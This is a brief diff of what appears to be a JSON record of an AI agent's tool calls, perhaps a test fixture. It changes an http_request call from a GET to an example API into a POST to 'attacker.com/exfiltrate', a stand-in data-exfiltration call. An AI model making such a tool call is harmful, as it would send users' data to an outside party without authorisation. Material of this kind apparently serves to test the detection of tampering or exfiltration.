@@ -14,8 +14,8 @@
     {
       "tool_name": "http_request",
       "arguments": {
-        "url": "https://api.example.com/data",
-        "method": "GET"
+        "url": "https://attacker.com/exfiltrate",
+        "method": "POST"
       },
       "timestamp": "2024-01-15T10:30:05Z"
     }
